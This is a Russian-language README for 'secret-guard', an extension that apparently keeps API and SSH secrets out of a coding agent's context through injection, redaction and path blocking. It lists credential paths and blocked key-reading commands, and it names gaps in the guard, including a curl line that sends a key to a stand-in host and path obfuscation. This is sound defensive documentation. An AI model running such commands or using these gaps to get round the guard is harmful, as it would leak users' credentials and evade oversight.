# secret-guard

Даёт агенту **пользоваться** секретами, не давая их **увидеть**. Значение не попадает ни в контекст модели, ни в файл сессии, ни к провайдеру.

## Модель угроз

Единственный путь к провайдеру: `вывод инструмента → контекст → файл сессии`. Поэтому инвариант, который здесь реально обеспечивается — **«ни одно значение секрета не появляется в выводе инструментов»**, а не «агент не может прочитать файл». Второе неисполнимо: агент умеет запускать shell.

Пять точек контроля:

1. **Хранение.** `~/.pi/agent/secrets/entries/<NAME>.dpapi` — base64 блоб Windows DPAPI (`CurrentUser`). Плейнтекста на диске нет. Расширение расшифровывает его только в свою память процесса.
2. **Доставка.** Значения инжектятся в env **дочернего процесса bash** через `spawnHook`. Работает как `curl -H "x-api-key: $NAME" ...`, само значение не попадает ни в текст команды, ни в аргументы инструмента — и, что критично, **не лежит в `process.env` самого pi-процесса**.
3. **Редакция.** Каждый `tool_result` вычищается: точное значение + base64 + URL-encoded + hex → `[REDACTED:NAME]`. Плюс стриминговая редакция вывода пользовательских `!` команд (с удержанием хвоста, чтобы значение не протекло через границу чанка).
4. **Блокировка.** Glob-паттерны по путям: vault, `.ssh`, `*.pem`, `.env`, `auth.json`, `.aws/credentials`, `.gnupg`, `.kube/config`, `.netrc`, `.pgpass` и др. Проверяется ввод **любого** инструмента, не только `read`. Whitelist для `.env.example` и подобных.
5. **Использование ключа без чтения.** Приватный SSH-ключ недоступен как файл, но его можно подставить ssh-команде как identity: `ssh -i <key> host`, `scp -i <key> ...`, `sftp -i <key>`, `ssh-add <key>`, а также `--identity`, `-o IdentityFile=...`, `-oIdentityFile=...`. Поблажка **позиционная**: из текста команды вырезается ровно тот аргумент, который читает сам ssh-бинарник, поэтому `cat <key>`, `cp <key>`, `base64 <key>`, второе вхождение того же пути в той же строке и любой читающий инструмент остаются заблокированными. См. `ssh-key-use.ts` и раздел «SSH-ключи» ниже.

## Почему значения НЕ в `process.env`

Дочерние агенты наследуют env, но запускаются с `--no-extensions` — guard в них не грузится. Проверено по исходникам и воспроизведено в тесте:

| Путь запуска | Расширение грузится? | Env наследуется? |
|---|---|---|
| `bg_delegate` (isolated) | ❌ `--no-extensions` (`pi-background-tasks/src/core/delegate/launch.ts`) | ✅ `{...process.env}` минус идентичность сессии |
| `pi-subagents` async | ❌ `--no-extensions` (`src/runs/background/async-execution.ts`) | ✅ `{...omitExtensionBindingsEnv(process.env)}` |
| `pi -p` / `bg_run` | ✅ глобальный `~/.pi/agent/extensions/` | ✅ |

Если положить значения в `process.env`, любой такой ребёнок получит их **без редакции** — воспроизводимая утечка. С spawn-hook ребёнок не получает ничего.

## Установка и использование

```bash
# добавить секрет (маскированный ввод)
powershell -NoProfile -File ~/.pi/agent/secrets/setup.ps1 -Add MY_API_KEY

# из stdin, для автоматизации
printf '%s' "$VALUE" | powershell -NoProfile -File ~/.pi/agent/secrets/setup.ps1 -AddFromStdin MY_API_KEY

# список (расшифровывает, чтобы показать длину) и удаление
powershell -NoProfile -File ~/.pi/agent/secrets/setup.ps1 -List
powershell -NoProfile -File ~/.pi/agent/secrets/setup.ps1 -Remove MY_API_KEY
```

В pi: `/secrets` — статус (имена, длины, не протёк ли кто в process env), `/secrets reload` — перечитать vault после добавления. После установки расширения нужен перезапуск pi или `/reload`.

Значения доступны в bash как обычные переменные окружения:

```bash
curl -s -H "Authorization: Bearer $MY_API_KEY" https://api.example.com/v1/ping
```

## Конфигурация

`~/.pi/agent/secrets/config.json`:

| Поле | По умолчанию | Смысл |
|---|---|---|
| `minSecretLength` | `8` | Короче — не берётся вообще (риск ложных срабатываний редакции) |
| `injectIntoBash` | `true` | Инжектить в env bash-команд агента |
| `injectIntoUserBash` | `true` | То же для пользовательских `!` команд |
| `protectUserBash` | `true` | Редактировать вывод `!` команд |
| `exposeToChildProcesses` | `false` | Положить значения в `process.env`, чтобы их унаследовали дочерние агенты. **Осознанный даунгрейд:** дети запускаются с `--no-extensions`, редакции у них нет — значение может уехать в их контекст |
| `blockedPathPatterns` | список | Glob'ы для **всех** инструментов (чтение, пробы, shell) |
| `writeBlockedPathPatterns` | список | Только `write`/`edit`: vault, `auth.json`, приватные ключи |
| `allowPathPatterns` | `[]` | Проверяется раньше блокировки |
| `allowSshKeyUse` | `true` | Разрешать ssh/scp/sftp/ssh-add читать ключ как свой identity-аргумент (см. раздел «SSH-ключи»). `false` — вернуть полный запрет на появление такого пути где-либо |
| `redactPrivateKeys` | `true` | Вычищать PEM-блоки (`-----BEGIN ... PRIVATE KEY-----`) из `tool_result` независимо от vault — вторая линия обороны на выходе |
| `metadataCommands` | `icacls`, `ls`, `attrib`, `stat`, `chmod`, `ssh-keygen`, … | Головы команд, которым можно **назвать** заблокированный путь: они выдают метаданные, но не содержимое. Формы с `|`, `>`, `&`, backtick и подстановками снимают поблажку — см. раздел ниже |
| `allowedBasenames` | `["known_hosts", "known_hosts.old"]` | Basenames, разрешённые внутри **любого** заблокированного каталога. `*.pub` разрешён всегда |

Рабочий пресет намеренно **не блокирует** `.env`, `.env.*`, `*.pem`, `*.p12`, `*.pfx` — их чтение это нормальная работа. Защита таких файлов держится на другом: добавь ключ в vault, и редакция вынет его значение даже из прочитанного файла. То есть vault работает ещё и как словарь редакции — клади туда любой ключ, который не хочешь видеть в контексте, даже если инжектить его не нужно.

## SSH-ключи: можно пользоваться, нельзя читать

Ключ (в этом сетапе — файл `sielom` в каталоге `~/.ssh`) доступен агенту как identity и недоступен как содержимое.

**Разрешено** (вырезается из проверки путей ровно этот аргумент):

```bash
ssh -i <key> -o StrictHostKeyChecking=accept-new user@host 'hostname'
scp -i <key> ./file user@host:/tmp/
sftp -i <key> user@host
ssh-add <key>
ssh --identity <key> user@host
ssh -o IdentityFile=<key> user@host
ssh -o "IdentityFile=<key>" user@host
ssh -oIdentityFile=<key> user@host
```

**Заблокировано** и остаётся заблокированным:

```bash
cat <key>                          # прямое чтение
base64 <key>                       # производная форма
cp <key> /tmp/x                    # копия в неблокируемое место
ssh -i <key> host 'cat <key>'      # тот же путь вторым вхождением
ssh -i <key> -o "ProxyCommand=cat <key>" host
ssh -i <key> host && cat <key>
rsync -e ssh -i <key> src dst      # у rsync -i это --itemize-changes, не identity
rsync -e "ssh -i <key>" src host:/x
git -c core.sshCommand="ssh -i <key>" fetch
bash -c 'cat <key>'
cat 'x; ssh -i <key> y'            # ; внутри кавычек не создаёт ssh-сегмент
for k in <key>; do ssh -i $k host; done
```

Механика: поблажка выдаётся не «пути», а **позиции аргумента**. Совпадения вырезаются из текста команды до проверки путей, поэтому любое второе вхождение того же пути снова видно проверке. Вложенные формы (`rsync -e "ssh -i ..."`, `core.sshCommand=`, подстановки `$(...)`), циклы и головы за `sudo -u` намеренно не разбираются — они остаются заблокированными, и это безопасное направление ошибки.

Вторая линия обороны — на выходе: любой PEM-блок вычищается из `tool_result` в `[REDACTED:PRIVATE-KEY]`, даже если vault пуст. Частичный обход проверки путей (обфускация вида `~/.ss""h/...`) всё ещё не выносит ключ в контекст.

Проверки: `~/tmp/secret-guard-test` — юнит-тесты чистого модуля плюс сквозные прогоны самого guard'а через его `tool_call`/`tool_result` на стабе SDK (51 тест).

## Чего это НЕ делает

- **Не песочница.** Модель, которая умеет запускать shell, может отправить значение в сеть, не выводя его в контекст (`curl "https://x/?k=$KEY"`). Редакция от этого не спасает, потому что защищает вывод, а не сеть. Выпускай scoped/short-lived ключи, а не root.
- **Не защита от целенаправленной атаки.** Модель угроз — кооперативная: против случайной утечки (echo, `env`, лог, `curl -v`, случайный `cat`). Не против prompt injection из репозитория (в конфиге `defaultProjectTrust: "always"` это реальный риск).
- **Не покрывает неизвестные трансформации.** Ловятся точная форма, base64, URL-encoded, hex. Подписанные/производные значения (JWT, хеши) — нет.
- **Дочерние агенты не получают ключи вовсе** (пока `exposeToChildProcesses: false`). Это следствие дизайна: `bg_delegate`/`pi-subagents` запускаются с `--no-extensions`. Флаг `exposeToChildProcesses: true` снимает это ограничение ценой возврата утечки, воспроизведённой в тесте: ребёнок видит значение и у него нет редакции.
- **`.env` и `*.pem` больше не блокируются.** Значит значение из `.env`, которого нет в vault, попадёт в контекст как есть. Митигация: добавь его в vault — редакция вычистит его и из файла.
- **Многострочные значения** поддержаны транспортом (base64) и покрыты CRLF-вариантами редакции, но на реальных PEM прогонялся только синтетический тест.
- **`--no-extensions` ребёнок, которому значение передали явно**, увидит его как есть — это и есть вектор, ради которого значения не кладутся в `process.env`.
- **Поблажка `-i` не shell-парсер.** Это разбор аргументов ssh-команд, поэтому вложенные формы (`rsync -e "ssh -i ..."`, `core.sshCommand=`, `$(...)`), циклы и `sudo -u` остаются заблокированными. Обфускация пути проверку не проходит по-прежнему, а вырезание PEM-блока делает такую попытку бесполезной для контекста — но это ровно два слоя защиты на тексте, а не песочница.
- **Копия ключа вне `~/.ssh` не отслеживается.** Команды, читающие или копирующие исходный путь, блокируются, но если ключ уже лежит в другом месте (или попал к агенту иным способом), guard о нём не знает. Держи ключ только в `~/.ssh` и не разводи приватный материал по неблокируемым путям.
- **Метаданные ≠ бесплатно.** Поблажка для `metadataCommands` — это отверстие в проверке путей по построению. Она держится на том, что перечисленные головы не печатают содержимое и не запускают вложенных команд. Список короткий намеренно: добавление в него интерпретатора (`node`, `python`, `powershell`, `bash`) снимает защиту целиком.
- **PEM-редакция ловит только PEM.** Одна строка ключа, base64 от ключа или хеш не вырезаются — сигнатуры для них нет. Всё, что реально нужно скрыть, кладётся в vault и вычищается словарём.

## Метаданные vs содержимое

Инвариант тот же — **значение не попадает в контекст**, — но проверка путей больше не мешает работать с файлом, содержимое которого читать нельзя. Три точечных послабления:

1. **Метаданные.** Головы из `metadataCommands` (`icacls`, `attrib`, `takeown`, `stat`, `chmod`, `ls`, `dir`, `ssh-keygen`, …) могут называть заблокированный путь: они выдают права, владельца, размеры, имена, отпечаток — но не байты. Поблажка снимается, если в строке есть `|`, `>` или `<`, одиночный `&`, backtick, `$(…)`, `${…}` или `{`: такие формы могут передать путь читателю (`ls <key> | xargs cat`) или переписать сам файл (`icacls <key> > <key>`). `;` и `&&` — граница сегментов, каждый судится отдельно.
2. **Публичный материал.** `*.pub` и `known_hosts*` разрешены в любом каталоге, включая заблокированные: публичный ключ не секрет, а хост-отпечатки — не учётные данные. Это правило по basename, а не по пути: glob на имя `config` открыл бы заодно конфиг kube. По той же причине конфиг ssh-клиента остаётся закрытым, пока его не добавит в `allowPathPatterns` сам пользователь.
3. **Путь ≠ payload.** `write`/`edit` судятся по **целевому пути**, а не по тексту `content` / `oldText` / `newText`. До этого записать файл, в котором просто упомянут заблокированный путь (документация, скрипт), было нельзя, а защиты это не добавляло: сам путь уже проверен отдельно.

Остались заблокированными: `cat`, `head`, `base64`, `cp`, `mv`, `rm`, `grep`, любые интерпретаторы (`bash`, `python`, `powershell`, …), `read`/`write`/`edit` по самому файлу ключа.
